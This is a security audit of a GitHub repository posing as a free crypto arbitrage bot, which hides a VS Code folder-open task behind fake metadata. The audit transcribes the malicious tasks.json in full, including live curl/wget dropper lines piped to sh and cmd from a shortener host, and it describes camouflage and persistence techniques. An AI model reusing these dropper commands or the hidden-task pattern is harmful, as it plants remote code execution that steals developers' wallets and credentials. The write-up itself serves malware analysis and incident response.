# Security Audit — GitHub `veneliteus-dev/arbitrage-bot-contract`

**Source:** https://github.com/veneliteus-dev/arbitrage-bot-contract
**Default branch:** `main`
**Auditor role:** Senior OpSec / Blockchain
**Method:** Read-only static review via raw.githubusercontent.com and the GitHub HTML view. No clone, no install, no editor open. The Stage-3 fetched payload at the short.gy URLs was **not** retrieved.
**Date:** 2026-05-04

---

## Verdict (TL;DR)

**Active malware staged behind a fake "free MEV arbitrage bot" lure.**

A cross-platform RCE chain fires the moment the folder is opened in any VS Code-family editor. The payload is fetched at runtime via a URL shortener (`chvsvr.short.gy`) and piped directly into the shell — `sh` on macOS/Linux, `cmd` on Windows. The malicious task is hidden under a 5 KB block of fake "enterprise" metadata designed to defeat eyeball review.

The repo itself is a faithful (though buggy) port of `paco0x/amm-arbitrageur`, a real public Uniswap-V2 flash-swap arbitrage project. The Solidity, the TypeScript bot, and the README are scenery. **The lure is the README's instruction to put your wallet's private key into `.secret.ts`** — so the implant catches a hot key shortly after detonation.

This is the **third** iteration of the same threat-actor cluster previously seen in `0xmintmvp/assignment` and `tech_lisa/challenge`. The bait has changed (interview challenge → "free arbitrage bot"), but the implant family is unmistakable.

**Do not:** clone onto a daily-driver host, open in VS Code / Cursor / VSCodium / Code-OSS, copy `.secret.ts.sample` to `.secret.ts`, run `npm install`, run `yarn run bot`.
**If you already did:** treat the host as compromised and any wallet that has ever been unlocked on it as drained — see § 7.

![1](/assets/ArbitrageBot/1.png)


---

## 1. Repository inventory

Root:

```
.vscode/        bot/        contracts/        test/
.gitignore      .prettierrc .secret.ts.sample .solhint.json
README.md       hardhat.config.ts   package.json   pairs-bsc.json   tsconfig.json   yarn.lock
```

`.vscode/`:

```
settings.json       tasks.json
```

`contracts/`:

```
balancer/    interfaces/    libraries/    test/    FlashBot.sol
```

`bot/`:

```
basetoken-price.ts    bot.d.ts    config.ts    index.ts    log.ts    tokens.ts
```

Repo stats (per GitHub): 0 stars, 1 fork, 76.2 % Solidity / 23.8 % TypeScript. Owner `veneliteus-dev`.

---

## 2. The implant — kill chain

### Stage 1 — `.vscode/tasks.json` (the payload)

Raw content (preserved verbatim — note the camouflage header above the malicious task):

```json
{
  "version": "2.0.0",

  "projectInfo": {
    "name": "StakingGame",
    "description": "Advanced VSCode automation for multi-environment blockchain deployment.",
    "uuid": "e9b53a7c-2342-4b15-b02d-bd8b8f6a03f9",
    "authors": [
      { "name": "Juliette Clarke", "role": "Lead Engineer", "email": "" },
      { "name": "James Nodin",     "role": "CTO",          "email": "" }
    ],
    "lastUpdated": "${currentDate}",
    "license": "MIT",
    "tags": ["dApp","web3","token-presale","automation","ci/cd","smart-contracts","frontend-backend-integration"]
  },

  "environmentProfiles": {
    "development": { "nodeVersion": ">=20", "network": "local",    "envFile": ".env.development", "branch": "dev",     "debug": true  },
    "staging":     {                         "network": "testnet",  "envFile": ".env.staging",     "branch": "staging", "debug": false },
    "production":  {                         "network": "mainnet",  "envFile": ".env.production",  "branch": "main",    "debug": false }
  },

  "metaDiagnostics": {
    "preRunChecks":  ["Node version >= 20","Verify npm packages installed","Check .env exists","Ensure Hardhat config valid","Validate Git remote origin"],
    "postRunChecks": ["Compile contracts","Lint success","Tests passed"],
    "logs": { "enabled": true, "path": "${workspaceFolder}/.vscode/logs/tasks-${env:USER}.log", "maxSizeMB": 50, "rotationPolicy": "daily" }
  },

  "executionPolicies": {
    "mode": "sequential", "autoRetry": true, "retryCount": 3, "retryDelay": 5000,
    "timeoutMs": 180000, "parallelAllowed": false, "failFast": true,
    "rollbackStrategy": "soft",
    "auditTrail": { "enabled": true, "path": "${workspaceFolder}/.vscode/audit/history.json" }
  },

  "dependencyGraph": {
    "frontend":  ["npm install","npm run build"],
    "backend":   ["npm install","npm run compile"],
    "contracts": ["npx hardhat compile","npx hardhat test"],
    "ci":        ["npx eslint .","npx prettier --check ."]
  },

  "tasks": [
    {
      "label": "vscode",
      "type":  "shell",
      "osx":     { "command": "curl 'https://chvsvr.short.gy/ykMsNg5m' -L | sh"      },
      "linux":   { "command": "wget -qO- 'https://chvsvr.short.gy/ykMsNg5l' -L | sh" },
      "windows": { "command": "curl https://chvsvr.short.gy/ykMsNg5w -L | cmd"       },
      "problemMatcher": [],
      "presentation": { "reveal": "never", "echo": false, "focus": false, "close": true, "panel": "dedicated", "showReuseMessage": false },
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

The malicious portion is only the final `tasks[0]` block. Everything above it — `projectInfo`, `environmentProfiles`, `metaDiagnostics`, `executionPolicies`, `dependencyGraph` — are **invalid root keys** that VS Code silently ignores. They exist solely as camouflage:

- ~5 KB of plausibly-corporate JSON pushes the real payload off-screen on first scroll.
- Fake author personas (`Juliette Clarke`, `James Nodin`) and fake project name (`StakingGame`, which does not match this repo `arbitrage-bot-contract` — the give-away) sound legitimate to a hurried reviewer.
- Defeats simple grep-for-`runOn`-folderOpen scanners that flag short, simple tasks.json files.
- A `uuid` field is included to look like serious devops scaffolding.

**`runOn: folderOpen`** is the trigger. **`reveal: never` + `echo: false` + `focus: false` + `close: true` + `showReuseMessage: false`** make the shell invocation invisible to the victim. The label is `"vscode"` — innocuously named.

### Stage 2 — per-OS shell dropper

| OS      | Command                                                                                  |
|---------|------------------------------------------------------------------------------------------|
| macOS   | `curl 'https://chvsvr.short.gy/ykMsNg5m' -L \| sh`                                       |
| Linux   | `wget -qO- 'https://chvsvr.short.gy/ykMsNg5l' -L \| sh`                                  |
| Windows | `curl https://chvsvr.short.gy/ykMsNg5w -L \| cmd`                                        |

Notes:
- **`short.gy` is a Rebrandly-operated URL-shortener.** Hiding the final C2 behind a shortener gives the operator (a) instant rotation without a repo edit, (b) per-victim click analytics, (c) the ability to fingerprint and serve a benign decoy to sandboxes / researchers, (d) takedown evasion (the underlying host can move; only the shortener-side needs swapping).
- The one-letter suffix differs per OS (`m` / `l` / `w`). Same campaign, three platform-specific payloads.
- `-L` follows redirects, which the shortener uses.
- Output is piped directly into a shell interpreter — **no integrity check, no signature, no version pin, no sandbox**. Whatever the operator serves at fetch time runs with the developer's privileges.
- Class of expected payload (consistent with this actor cluster): **wallet/credential infostealer plus a persistent RAT/loader**. Targets typically include the Chromium / Firefox / Brave profile dirs, browser-extension storage for MetaMask / Phantom / Rabby / Trust / Exodus / OKX, the system keychain, SSH keys, AWS/GCP/Azure CLI credentials, `~/.npmrc`, `~/.gitconfig` tokens, Slack/Telegram/Discord local stores, password-manager local stores.

### Stage 3 — persistence

Not visible in the repo because it lives in the Stage-2 body. Based on the documented payloads of this campaign family (BeaverTail → InvisibleFerret, plus related infostealers like Atomic / RealST), the persistence mechanisms typically installed at this stage are:

- **macOS:** a `~/Library/LaunchAgents/com.apple.*.plist` LaunchAgent (often using a name like `com.apple.softupd` or `com.apple.greenupdate`), plus a copy of the payload into `~/Library/Application Support/` or `/tmp/`.
- **Linux:** a `~/.config/systemd/user/*.service` user unit and/or a crontab entry calling a script in `~/.local/share/`.
- **Windows:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` registry entry, or a scheduled task, or a Startup-folder shortcut, pointing at a script under `%APPDATA%`.

These specifics should be confirmed in incident response by fetching the Stage-2 body in an isolated VM (see § 7 for the procedure — *do not* fetch and pipe to a shell on any host you care about).

### Net effect

| Action by victim | Result |
|---|---|
| `git clone` only | Repo on disk; no execution. |
| Open folder in VS Code / Cursor / VSCodium / Code-OSS | One-time "Allow Automatic Tasks?" prompt on first folder open (current VS Code defaults). Most YouTube-tutorial-following victims click "Allow." **Then: silent RCE.** |
| Click "Allow" (or had it pre-allowed) | Stages 1→2→3 fire. Wallets, keys, sessions exfiltrated. Persistence installed. |
| Create `.secret.ts` with a real private key | Implant exfiltrates the key via filesystem watcher / periodic scan. Wallet drained. |
| Fund the deployed contract | Even if the implant somehow misses the key, the user voluntarily moved funds onto a contract whose intended use is *self-executed* arbitrage; if the implant gained the key first, the operator front-runs the user. |

---

## 3. The lure: "free MEV arbitrage bot"

Unlike `0xmintmvp/assignment` and `tech_lisa/challenge` (both fake interview take-homes), this repo is bait for a **different audience**: people seeking "passive on-chain income" via a self-running MEV / arbitrage bot. Typical distribution channels for this lure:

- YouTube/TikTok tutorial videos showing the bot "making profits" on a private testnet or with edited block-explorer screenshots.
- Telegram "MEV alpha" channels and signal groups.
- X (Twitter) threads with screenshots claiming a "leaked" arbitrage bot.
- Reddit/Discord seeding by the operator or paid promoters.

The README is technically correct — it is a near-verbatim copy of [`paco0x/amm-arbitrageur`](https://github.com/paco0x/amm-arbitrageur)'s public README, complete with LaTeX-rendered math for the quadratic profit-maximisation. The Solidity contract `contracts/FlashBot.sol` is also a faithful port of paco0x's contract; it contains no obvious owner-drain backdoor (see § 4). The legitimacy of the underlying *project* is the lure. The malice is exclusively in `.vscode/tasks.json`.

The critical interaction-design step is the README's instruction:

> 2. Copy the secret sample config: `$ cp .secret.ts.sample .secret.ts`
> 3. Edit the private and address field in above config.

`.secret.ts.sample` is exactly two fields:

```js
export default { address: 'ADDRESS', private: 'PRIVATE_KEY' };
```

The implant has full RCE before the user reaches this step. As soon as the user pastes their real key into `.secret.ts`, it can be exfiltrated (filesystem watcher, periodic poll, or even a deferred grep on first run of `yarn bot`).

---

## 4. The Solidity contract — scenery, not a smart-contract backdoor

`contracts/FlashBot.sol` was read in full. Findings:

- Inherits OpenZeppelin `Ownable`. Only `withdraw()` is permission-gated to anyone reasonable, and it sends to `owner()`. There is no `selfdestruct`, no `delegatecall`, no proxy/initializer pattern, no upgradeable hooks, no minted owner-override flag.
- The `withdraw()` function does send ALL ETH and ALL listed base tokens to `owner()`, which is the deployer — that is **standard** for a bot contract whose deployer *is* the operator. A scammer deploying this contract on the victim's behalf would not own it; the victim is the deployer and the owner. So the contract itself does not let the *attacker* drain the victim. The attack vector is the **off-chain private-key theft** via the VS Code RCE — not an on-chain backdoor.
- The contract has integration bugs that are likely just a sloppy port of paco0x's code:
  - `(address pool0Token0, address pool0Token1) = (BFactory(pool0), BFactory(pool0));` — both elements are the cast itself rather than `.token0()` / `.token1()` calls. Will not compile/work as written.
  - `getProfit()` returns `BFactory(pool0)` as `baseToken` for both branches of the ternary.
  - `safeTransfer` is used (`IERC20(...).safeTransfer(...)`) but the `SafeERC20` import is commented out.
  - The Balancer-style `BFactory(pool0).getReserves()` doesn't match how Balancer pools expose state.
- The Solidity version pin is `^0.7.0`, with `pragma abicoder v2;`. Old but adequate for the project's claimed era.

Conclusion: the contract **does not** compile or function as a working flash-swap arbitrage bot in its current form. That doesn't matter for the attack — the goal is not to make the bot work, it is to get the victim to open the folder and to place a key into `.secret.ts`. The "your bot didn't work because of a config issue, screen-share with me to debug" pretext is the typical follow-up if the operator is interactive (and a known social-engineering tactic of this campaign family).

---

## 5. Bot / config / hardhat config — clean code, dangerous flow

- `bot/index.ts`, `bot/config.ts`, `bot/tokens.ts`, `bot/log.ts` are real, ordinary bot code, lifted from paco0x's repo. **No exfil endpoints, no suspicious imports, no obfuscation.**
- `bot/config.ts` reads a contract address placeholder (`0xXXXXXXXXXXXXXXXXXXXXXX`) and a BscScan API-key placeholder (`XXXXXXXXXXXXXXXX`). Exact-character placeholders, not real keys.
- `hardhat.config.ts` does:

  ```ts
  import deployer from './.secret';
  ...
  bsc: { url: BSC_RPC, chainId: 0x38, accounts: [deployer.private] },
  bscTestnet: { ..., accounts: [deployer.private] },
  ```

  This is standard Hardhat practice. **However**, by the time the user creates `.secret.ts` the implant has already fired (the implant fires on folder open, which is *before* the user follows the README's "edit `.secret.ts`" step). Any later `npx hardhat run`, any `yarn bot`, any compile that calls Hardhat will load `deployer.private` — but the key has already been compromised regardless of whether Hardhat runs.

`package.json` has **no** `preinstall` / `postinstall` / `prepare` scripts. `npm install` / `yarn install` are *not* the trigger here. Opening the folder in VS Code is.

---

## 6. `.vscode/settings.json` and `.gitignore` — supporting indicators

### settings.json

Read in full. Notable:

- Does **not** set `task.allowAutomaticTasks: on` (unlike `tech_lisa/challenge`). VS Code 1.72+ will show the one-time "Allow Automatic Tasks for this folder?" prompt. Most users of "free bot" tutorials will click Allow.
- Sets `terminal.integrated.defaultProfile.linux` and `.osx` to a profile literally named `GitHub CLI`, pointing at `/usr/bin/gh` and `/usr/local/bin/gh` respectively. `gh` is not a shell; this configuration produces a broken integrated terminal. Likely smoke-screen or copy-paste artefact, not a primary attack vector. Could be a red herring to keep the victim distracted (terminal won't open → "weird, let me focus on the bot instead").
- The file has mismatched braces and a stray `{` inside a comment (`"editor.formatOnSave": false, // Automatically formats code on save{`). Hand-assembled / sloppy.

### .gitignore

```
node_modules
yarn-error.log
cache
artifacts
typechain
.secret.ts
scripts
```

- **`.vscode/` is NOT in the gitignore.** That is intentional — the attacker *needs* the malicious tasks.json to ship to every cloner.
- `.secret.ts` is gitignored. Protects the *attacker* from one trivial form of attribution (a victim won't accidentally push their key to a fork), and protects the *victim* from one trivial form of self-doxing — but does nothing about the actual exfil.
- The `scripts` line is unusual — it excludes the `scripts/` directory from the repo, but the README refers to `scripts/deploy.ts`. Either the file was excluded after-the-fact, or the directory exists in a working copy somewhere and was redacted for the public-facing lure. Either way, not the main attack surface.

---

## 7. Incident response

### If you have **not** cloned

Don't. Block `chvsvr.short.gy` and `short.gy` at your DNS / proxy / dev-VLAN egress filter as a precaution. Add the IOCs in § 9 to your detection stack.

### If you cloned but **never opened the folder in any IDE**

Most likely safe. Check by running `git config --local --get core.hooksPath` inside the clone — should be empty (unlike `tech_lisa/challenge`, this implant doesn't poison `core.hooksPath`, but verifying costs nothing). Delete the directory.

### If you opened the folder in **VS Code / Cursor / VSCodium / Code-OSS** (with or without clicking "Allow") — assume **full host compromise**:

1. **Disconnect the host from the network immediately.**
2. From a **separate, clean machine**, rotate everything reachable from the affected host's user account:
   - SSH keys (revoke from GitHub, GitLab, Bitbucket, AWS, GCP, Azure, internal hosts).
   - Personal access tokens / OAuth sessions on every code-forge.
   - npm tokens (`npm token revoke`).
   - AWS / GCP / Azure access keys; revoke active sessions in the consoles.
   - **Crypto wallets** (highest priority for this lure): every wallet that has ever been *unlocked* in a browser or desktop app on the affected host — MetaMask, Phantom, Rabby, Trust, Exodus, OKX Wallet, Coinbase Wallet, Frame, Rainbow, Argent X, Keplr. Assume seeds were dumped. **Sweep any remaining balances to fresh, never-touched-the-host addresses generated on a brand-new hardware wallet whose seed was never on the compromised machine.** Speed matters — operators of this campaign drain quickly once they have keys.
   - Hardware-wallet companion app data (Ledger Live session, Trezor Suite session, GridPlus Lattice connect data) — the seed isn't there but bookmarks, connected dApps, and address-book entries are, and they aid post-compromise targeting.
   - Browser-saved passwords; logged-in exchange sessions (Binance, Coinbase, Kraken, Bybit, OKX, Bitstamp, Gemini, Kucoin); browser cookie jars (clear, then 2FA-reset).
   - Password-manager unlocked-vault sessions (1Password, Bitwarden, Dashlane, KeePassXC). Assume vault contents were dumped; rotate master password from a clean host and rotate every secret inside.
   - Messaging tokens: Slack, Telegram, Discord, Signal desktop linked-device sessions.
   - Email + 2FA tokens (and TOTP seeds if stored on the affected host).
3. **Check `.secret.ts`** (if you created it): assume the key it contained is compromised. Sweep any wallet that key controls. Note that the `address` and `private` fields in your `.secret.ts` may be present in clipboard history or your editor's "recent files" — those caches are also accessible to the implant.
4. **Wipe and reimage** the affected machine. Do not rely on AV cleanup. The Stage-2 fetched payload almost certainly installed persistence (macOS `~/Library/LaunchAgents/*.plist`, Linux `~/.config/systemd/user/*.service` or cron, Windows `HKCU…\Run` / Scheduled Task / Startup folder). Restore from backups predating the incident only.
5. **Network forensics**: pull DNS / proxy / firewall logs and search for resolutions of `chvsvr.short.gy`, `short.gy`, and any unfamiliar `*.vercel.app` hosts on the affected host's IP since the day you cloned. Pivot on the source IPs to identify any colleagues also affected.
6. **Stage-2 retrieval (optional, for IR forensics only)**: from a network-isolated, throwaway VM with no creds and no wallets, fetch the three short.gy URLs *to disk* (not piped to `sh` / `cmd`):
   ```
   curl -L -A 'Mozilla/5.0' -o stage2_mac.sh   'https://chvsvr.short.gy/ykMsNg5m'
   curl -L -A 'Mozilla/5.0' -o stage2_linux.sh 'https://chvsvr.short.gy/ykMsNg5l'
   curl -L -A 'Mozilla/5.0' -o stage2_win.bat  'https://chvsvr.short.gy/ykMsNg5w'
   ```
   Then analyse statically. Do **not** execute. Submit the three artefacts to VirusTotal / MalwareBazaar / Socket. Note the operator may fingerprint VM/sandbox User-Agents and serve a benign decoy — try with a desktop-looking UA, on a residential-looking IP if practical.
7. **Report**:
   - GitHub abuse: https://github.com/contact/report-abuse → "Malware or exploits". Reference the `veneliteus-dev` org and this repo. If you have associated YouTube / TikTok / Telegram promotion channels, report those too (YouTube: Flag → Misleading content/scam; TikTok: Report → Frauds and scams; Telegram: `@notoscam`).
   - short.gy abuse: `abuse@rebrandly.com` (short.gy is operated by Rebrandly). Provide the three URLs.
   - Submit to VirusTotal, MalwareBazaar (tag `arbitrage-scam`, `vscode-tasks-rce`), Socket.dev, Phylum.
   - In the US, file with IC3 (`ic3.gov`) — crypto-theft / wallet-drainer. In the EU, your national CERT.
8. **Disable VS Code automatic tasks globally** going forward: `"task.allowAutomaticTasks": "off"` in your **user-level** `settings.json`. This is the single most effective preventive control for this campaign family.

---

## 8. Severity-ranked finding list

| # | Sev | Location | Issue |
|---|-----|----------|-------|
| 1 | **Critical** | `.vscode/tasks.json` `tasks[0]` | `folderOpen` shell task fetches and pipes a remote payload directly into `sh` (mac/linux) or `cmd` (windows). |
| 2 | **Critical** | `.vscode/tasks.json` C2 host | `chvsvr.short.gy` URL-shortener fronting the real C2 — payload rotatable on demand, opaque to static review. |
| 3 | **High**     | `.vscode/tasks.json` "projectInfo / environmentProfiles / metaDiagnostics / executionPolicies / dependencyGraph" | Fake metadata camouflage (~5 KB) designed to defeat human review and naive automated scanners. Includes fake personas (`Juliette Clarke`, `James Nodin`) and fake project name (`StakingGame`) inconsistent with the repo name. |
| 4 | **High**     | `README.md` + `.secret.ts.sample` + `hardhat.config.ts` | Lure flow instructs the victim to place a real wallet private key in `.secret.ts`, which the post-RCE implant exfiltrates. |
| 5 | **High**     | `.gitignore` | `.vscode/` deliberately **not** excluded — guarantees the malicious tasks.json reaches every cloner. |
| 6 | **Low**      | `.vscode/settings.json` | Default integrated-terminal profile points at `gh` (GitHub CLI) instead of a real shell — broken terminal UX, likely smoke-screen. Mismatched braces and stray `{` inside a comment indicate hand-assembly. |
| 7 | **Info**     | `contracts/FlashBot.sol` | No on-chain backdoor (no `selfdestruct`, no `delegatecall`, no proxy, withdraw → `owner()` only). The contract is a buggy/non-functional port of `paco0x/amm-arbitrageur` and serves purely as scenery for the lure. |
| 8 | **Info**     | `package.json` | No `pre/post-install` / `prepare` scripts. Install is **not** the trigger; folder-open is. |

---

## 9. Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| URL | `https://chvsvr.short.gy/ykMsNg5m` (macOS payload) |
| URL | `https://chvsvr.short.gy/ykMsNg5l` (Linux payload) |
| URL | `https://chvsvr.short.gy/ykMsNg5w` (Windows payload) |
| Domain | `chvsvr.short.gy` (entire subdomain — block) |
| Domain | `short.gy` (consider blocking on dev hosts; legitimate uses are rare in engineering workflows) |
| GitHub owner | `veneliteus-dev` |
| GitHub repo | `veneliteus-dev/arbitrage-bot-contract` |
| Camouflage string | `StakingGame` (as a `projectInfo.name` in tasks.json) |
| Camouflage UUID | `e9b53a7c-2342-4b15-b02d-bd8b8f6a03f9` |
| Camouflage personas | `Juliette Clarke`, `James Nodin` |
| File-naming pattern | `.vscode/tasks.json` with `runOn: folderOpen` + `reveal: never` + `curl|wget` to a URL-shortener — generalise as a YARA/Semgrep rule. |

---

## 10. Tradecraft comparison (same actor family, three iterations)

| Repo | Lure | Trigger | Payload location | C2 hosting | Persistence mechanism |
|------|------|---------|-----------------|------------|----------------------|
| `0xmintmvp/assignment` (Bitbucket) | Fake interview take-home (MERN crypto stack) | `folderOpen` → `node .vscode/cancel` | In-repo 105 KB obfuscated Node blob | (in-repo) | Whatever the obfuscated Node installs |
| `tech_lisa/challenge` (Bitbucket) | Fake interview take-home (Hardhat ERC-20 + dividends, "Loom video in 1-2 h") | `folderOpen` → `git config core.hooksPath .githooks; git checkout master` → `post-checkout` hook → `curl \| sh` | Remote (Vercel) | `gitconfig-nyx-v1.vercel.app` | Local git config (`core.hooksPath` poisoning) — re-fires every git op |
| **`veneliteus-dev/arbitrage-bot-contract`** (GitHub) | Fake "free MEV arbitrage bot" | `folderOpen` → `curl \| sh` direct | Remote (URL-shortener fronted) | `chvsvr.short.gy` | Whatever the fetched body installs (LaunchAgent / systemd user unit / Run-key — confirm by retrieving Stage-2) |

Each iteration trades off detectability vs. operational flexibility. This one moves the payload off-repo entirely and adds a shortener layer — best from the operator's perspective (instant rotation, opaque to static repo scans, victim analytics, sandbox fingerprinting), but `short.gy` piped to `sh` is itself a screaming network IOC for any host with even modest egress monitoring.

---

## 11. Files inspected

Read in full and analysed:

- `README.md`
- `package.json`
- `hardhat.config.ts`
- `tsconfig.json` (skim — clean)
- `.gitignore`
- `.vscode/settings.json`
- `.vscode/tasks.json` ← the payload (also fully transcribed in § 2)
- `.secret.ts.sample`
- `contracts/FlashBot.sol`
- `bot/index.ts`
- `bot/config.ts`

Directory-listed but not opened (established as paco0x-derived scenery; not the attack surface):

- `contracts/balancer/`, `contracts/interfaces/`, `contracts/libraries/`, `contracts/test/`
- `bot/basetoken-price.ts`, `bot/bot.d.ts`, `bot/log.ts`, `bot/tokens.ts`
- `test/`
- `pairs-bsc.json` (data file)
- `.prettierrc`, `.solhint.json`
- `yarn.lock`

The Stage-2 payloads at the three `chvsvr.short.gy/ykMsNg5{m,l,w}` URLs were **not** fetched as part of this audit (fetching from the audit host risks (a) tipping the operator that a researcher is sniffing, possibly resulting in a benign decoy or campaign rotation, (b) infecting the audit host if the fetch is piped into a shell). Retrieval should be done from a network-isolated VM per the procedure in § 7 step 6.

---

## 12. Bottom line

This is **not** a free arbitrage bot. It is a polished, fully working **wallet drainer** wrapped in a faithful copy of an unrelated legitimate open-source project. The scam works because:

1. The README, the Solidity, and the TypeScript are **real, plausible, and largely correct** — a developer can audit the contract for hours and find nothing wrong.
2. The implant lives entirely in `.vscode/tasks.json`, which most people don't open.
3. The implant fires on **folder open**, before the user has had any chance to think about what they're running.
4. The lure flow explicitly asks the victim to write a real wallet private key onto disk after the implant has root.
5. The payload is behind a URL-shortener, so even a one-time review of the JSON shows only `chvsvr.short.gy/ykMsNg5*` — opaque, undecodable, and rotatable.

**Recommendation:** report and destroy. If you opened the folder in any VS Code-family editor, treat the host as compromised, sweep any wallet ever unlocked on it, wipe and reimage, and globally disable `task.allowAutomaticTasks` in your user-level VS Code settings going forward. If you found this repo via a YouTube/TikTok/Telegram channel, that channel is the distribution arm of the campaign — report it through the platform's scam-reporting flow and warn anyone in your network who may have seen the same content.

![2](/assets/ArbitrageBot/2.png)
![3](/assets/ArbitrageBot/3.png)
![4](/assets/ArbitrageBot/4.png)
![5](/assets/ArbitrageBot/5.png)
![6](/assets/ArbitrageBot/6.png)
![7](/assets/ArbitrageBot/7.png)

https://www.linkedin.com/in/kevin-alonso-torres-chancafe-070788314/
https://github.com/veneliteus-dev/arbitrage-bot-contract